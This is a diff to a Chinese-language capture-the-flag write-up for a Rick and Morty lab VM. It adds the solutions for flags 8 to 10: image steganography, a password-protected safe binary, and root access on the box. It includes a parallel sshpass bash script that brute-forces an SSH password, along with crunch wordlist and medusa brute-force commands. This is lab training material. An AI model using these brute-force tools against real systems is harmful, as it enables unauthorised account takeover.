@@ -196,11 +196,11 @@ FLAG{Flip the pickle Morty!} - 10 Points
 
 ### flag5
 
-80端口有一个http服务，进去是一张Rick的图片，用dirBuster扫一下目录，发现有`/passwords`目录，进去后看到flag文件。 FLAG{Yeah d- just don't do it.} - 10 Points
+80端口有一个http服务，进去是一张Morty的图片，用dirBuster扫一下目录，发现有`/passwords`目录，进去后看到flag文件。 FLAG{Yeah d- just don't do it.} - 10 Points
 
 ### flag6
 
-对目标进行目录扫描
+对目标进行目录扫描，可以使用dirsearch，dirbuster等
 
 ```bash
 $ dirsearch -u 192.168.56.101                    
@@ -290,4 +290,164 @@ FLAG.txt
 FLAG{Get off the high road Summer!} - 10 Point
 ```
 
-### 待续。。。
+### flag8
+
+继续利用得到的shell，研究其他还有哪些可疑文件
+
+```
+$ tree
+.
+├── Morty
+│   ├── journal.txt.zip
+│   └── Safe_Password.jpg
+├── RickSanchez
+│   ├── RICKS_SAFE
+│   │   └── safe
+│   └── ThisDoesntContainAnyFlags
+│       └── NotAFlag.txt
+└── Summer
+    ├── FLAG.txt
+    └── temp
+        ├── b64payloadgen.sh
+        ├── exploit.c
+        ├── Makefile
+        └── pwnkit64decoded.c
+```
+
+可以直接` scp -P 22222 -r Summer@192.168.56.101:/home .`将所有内容下载到本地研究。
+
+先研究Morty里面的文件，有一个zip压缩包，打开需要密码，另外是一张Rick的图片Safe_Password.jpg
+
+图片隐写，使用StegSolve打开该图片，查看File format，在里面找到密码为Meeseek，打开压缩文件夹中的journal.txt，内容如下：
+
+```
+Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?
+
+Anyway. Here it is:
+
+FLAG: {131333} - 20 Points 
+```
+
+### flag9
+
+研究RickSanchez里面的文件，主要就是safe，复制到Summer用户目录以打开，显示如下：
+
+```
+$ ./safe
+Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!
+```
+
+拿flag8的内容当作safe的密码，发现可以执行，得到flag。
+
+```
+$ ./safe 131333
+decrypt:        FLAG{And Awwwaaaaayyyy we Go!} - 20 Points
+
+Ricks password hints:
+ (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
+Follow these clues, in order
+
+
+1 uppercase character
+1 digit
+One of the words in my old bands name.� @
+```
+
+顺便说一下，一开始并没有找flag8时，我觉得逆向应该也能找到flag9啊，但我失败了。。。
+
+### flag10
+
+根据上文的提示，RickSanchez的密码应该时一个大写字母和一个数字再加Rick的一个老乐队中的单词的组合。
+
+搜一下就可以找到乐队的名字应该是[The Flesh Curtains ](https://rickandmorty.fandom.com/wiki/The_Flesh_Curtains)
+
+暴力破解试试，编写shell脚本如下：
+
+```bash
+#!/bin/bash
+
+# 设置一个标志文件来表示找到密码
+flag_file="password_found.flag"
+
+# 清理旗标文件（如果存在）
+rm -f $flag_file
+
+# 初始化计数器
+counter=0
+max_processes=10
+
+# 生成所有可能的密码并在后台尝试它们
+for uppercase in {A..Z}; do
+  for digit in {0..9}; do
+    for band in {"The","Flesh","Curtains"}; do
+      password="${uppercase}${digit}${band}" # 组合密码
+      echo "尝试密码: ${password}"
+
+      # 在后台尝试登录，并执行一个简单命令
+      (
+        if sshpass -p "${password}" ssh -p 22222 -o StrictHostKeyChecking=no RickSanchez@192.168.56.101 "echo 'Login Successful'" >/dev/null 2>&1; then
+          echo "找到密码: ${password}"
+          touch $flag_file
+          exit 0
+        fi
+      ) &
+
+      let counter+=1
+
+      # 检查是否找到密码，如果找到则退出循环
+      if [ -f $flag_file ]; then
+        break 3
+      fi
+
+      # 如果达到最大进程数，等待任意一个进程结束
+      if (( counter >= max_processes )); then
+        wait -n
+        let counter-=1
+      fi
+    done
+  done
+done
+
+wait # 等待所有后台进程完成
+
+# 如果没有找到密码
+if [ ! -f $flag_file ]; then
+  echo "未找到密码"
+else
+  rm -f $flag_file # 清理旗标文件
+fi
+```
+
+找到密码: P7Curtains
+
+登录root用户，成功获得最后一个flag！
+
+```bash
+$ sshpass -p "P7Curtains" ssh -p 22222 -o StrictHostKeyChecking=no RickSanchez@192.168.56.101
+Last failed login: Thu Dec 14 20:54:15 AEDT 2023 from 192.168.56.102 on ssh:notty
+There were 186 failed login attempts since the last successful login.
+Last login: Thu Dec 14 20:49:14 2023 from 192.168.56.102
+[RickSanchez@localhost ~]$ sudo su
+[sudo] password for RickSanchez:
+[root@localhost RickSanchez]# cd ~
+[root@localhost ~]# ls
+anaconda-ks.cfg  FLAG.txt
+[root@localhost ~]# more FLAG.txt
+FLAG: {Ionic Defibrillator} - 30 points
+```
+
+除了编写脚本外，也可以直接使用crunch生成字典，用[medusa](http://foofus.net/goons/jmk/medusa/medusa.html)或者hydra进行暴力破解
+
+```bash
+crunch 5 5 -t ,%The > dict.txt
+crunch 7 7 -t ,%Flesh >> dict.txt
+crunch 10 10 -t ,%Curtains >> dict.txt
+```
+
+```bash
+medusa -M ssh -h 192.168.56.101 -n 22222 -u RickSanchez -P ./dict.txt -f 
+```
+
+## 总结
+
+好玩！多玩！
